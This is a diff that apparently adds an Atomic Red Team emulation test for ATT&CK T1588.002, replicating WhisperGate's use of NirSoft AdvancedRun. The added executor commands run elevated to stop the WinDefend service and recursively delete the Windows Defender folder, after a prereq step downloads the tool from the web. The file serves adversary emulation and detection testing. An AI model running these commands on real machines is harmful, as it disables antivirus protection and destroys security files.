@@ -59176,7 +59176,48 @@ resource-development:
       x_mitre_detection: Much of this activity will take place outside the visibility
         of the target organization, making detection of this behavior difficult. Detection
         efforts may be focused on post-compromise phases of the adversary lifecycle.
-    atomic_tests: []
+      identifier: T1588.002
+    atomic_tests:
+    - name: Run NirSoft AdvancedRun
+      auto_generated_guid: f7d43d35-d628-4582-bb03-01b1c5e10d11
+      description: "Information on NirSoft AdvancedRun and it's creators found here:
+        http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe
+        with similar behavior identified during the WhisperGate campaign.\nUpon successful
+        execution, AdvancedRun.exe will run and stop Defender and attempt to delete
+        the Defender folder on disk. \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        local_folder:
+          description: Local path of AdvancedRun executable
+          type: Path
+          default: PathToAtomicsFolder\T1588.002\bin\AdvancedRun
+        local_executable:
+          description: name of the advancedrun executable
+          type: String
+          default: advancedrun.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Advancedrun.exe must be located at #{local_folder}\#{local_executable}
+
+'
+        prereq_command: 'if(Test-Path -Path #{local_folder}\#{local_executable}) {exit
+          0} else {exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "http://www.nirsoft.net/utils/advancedrun.zip" -UseBasicParsing -OutFile "$env:temp\AdvancedRun.zip"
+            Expand-Archive $env:temp\AdvancedRun.zip #{local_folder} -Force
+      executor:
+        command: |
+          #{local_folder}\#{local_executable} /EXEFilename "C:\Windows\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run
+          #{local_folder}\#{local_executable} "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /WindowState 0 /CommandLine "rmdir 'C:\ProgramData\Microsoft\Windows Defender' -Recurse" /StartDirectory "" /RunAs 8 /Run
+        cleanup_command: 'Remove-Item #{local_folder}\#{local_executable} -ErrorAction
+          Ignore
+
+'
+        name: powershell
+        elevation_required: true
   T1608.001:
     technique:
       external_references:
